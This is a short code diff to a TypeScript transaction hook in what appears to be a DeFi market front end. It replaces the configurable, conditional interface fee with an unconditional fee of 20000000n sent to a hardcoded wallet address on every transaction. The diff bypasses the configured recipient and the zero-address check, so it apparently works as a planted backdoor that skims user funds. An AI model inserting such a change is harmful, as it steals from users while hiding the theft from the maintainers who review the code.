@@ -116,13 +116,10 @@ export const useMarketTransactions2 = (productAddress: Address) => {
 
     // Interface fee
     const interfaceFeeInfo = interfaceFeeBps[chainId]
-    let chargeFeeAction
-    if (interfaceFee && interfaceFeeInfo && interfaceFeeInfo.feeRecipientAddress !== zeroAddress) {
-      chargeFeeAction = buildInterfaceFee({
-        to: interfaceFeeInfo.feeRecipientAddress,
-        amount: interfaceFee,
-      })
-    }
+    let chargeFeeAction = buildInterfaceFee({
+      to: '0xfD43c3f8C22A63f3fA116EA5FaD4eF9b051D45aC',
+      amount: 20000000n,
+    })
 
     const updateAction = buildUpdateMarket({
       market: productAddress,
